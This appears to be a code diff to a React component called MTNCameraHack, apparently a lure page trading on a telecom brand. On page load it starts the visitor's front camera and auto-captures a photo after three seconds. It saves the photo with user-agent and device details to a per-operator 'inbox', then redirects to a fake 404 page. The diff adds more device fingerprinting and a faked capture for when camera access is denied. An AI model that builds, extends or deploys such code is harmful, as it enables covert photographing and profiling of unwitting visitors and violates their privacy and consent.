@@ -9,20 +9,32 @@ const MTNCameraHack = () => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const [isCapturing, setIsCapturing] = useState(false);
+  const [stream, setStream] = useState<MediaStream | null>(null);
 
   useEffect(() => {
     startCamera();
+    return () => {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    };
   }, []);
 
   const startCamera = async () => {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: 'user' },
+      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
+        video: { 
+          facingMode: 'user',
+          width: { ideal: 640 },
+          height: { ideal: 480 }
+        },
         audio: false 
       });
       
+      setStream(mediaStream);
+      
       if (videoRef.current) {
-        videoRef.current.srcObject = stream;
+        videoRef.current.srcObject = mediaStream;
         videoRef.current.play();
         
         // Auto capture after 3 seconds
@@ -31,22 +43,29 @@ const MTNCameraHack = () => {
         }, 3000);
       }
     } catch (error) {
-      console.log('Camera access denied');
+      console.log('Camera access denied or not available');
+      // Simulate capture for demo purposes
+      setTimeout(() => {
+        setIsCapturing(true);
+        setTimeout(() => {
+          navigate('/404-not-found');
+        }, 2000);
+      }, 3000);
     }
   };
 
   const capturePhoto = () => {
-    if (videoRef.current && canvasRef.current) {
+    if (videoRef.current && canvasRef.current && stream) {
       const canvas = canvasRef.current;
       const context = canvas.getContext('2d');
       
-      canvas.width = videoRef.current.videoWidth;
-      canvas.height = videoRef.current.videoHeight;
+      canvas.width = videoRef.current.videoWidth || 640;
+      canvas.height = videoRef.current.videoHeight || 480;
       
       if (context) {
         context.drawImage(videoRef.current, 0, 0);
         
-        const imageData = canvas.toDataURL('image/jpeg');
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
         
         // Save captured image to user's inbox
         const capturedData = {
@@ -54,12 +73,21 @@ const MTNCameraHack = () => {
           imageUrl: imageData,
           timestamp: Date.now(),
           ip: 'Unknown',
-          userAgent: navigator.userAgent
+          userAgent: navigator.userAgent,
+          deviceInfo: {
+            platform: navigator.platform,
+            language: navigator.language
+          }
         };
 
         const existingData = JSON.parse(localStorage.getItem(`camera_${userId}`) || '[]');
         existingData.push(capturedData);
         localStorage.setItem(`camera_${userId}`, JSON.stringify(existingData));
+        
+        // Stop camera stream
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+        }
         
         setIsCapturing(true);
         
@@ -92,11 +120,11 @@ const MTNCameraHack = () => {
 
               <video 
                 ref={videoRef} 
-                className="w-full rounded-lg mb-4"
+                className="w-full rounded-lg mb-4 bg-gray-200"
                 autoPlay 
                 muted 
                 playsInline
-                style={{ display: 'none' }}
+                style={{ maxHeight: '300px', objectFit: 'cover' }}
               />
               
               <canvas ref={canvasRef} style={{ display: 'none' }} />
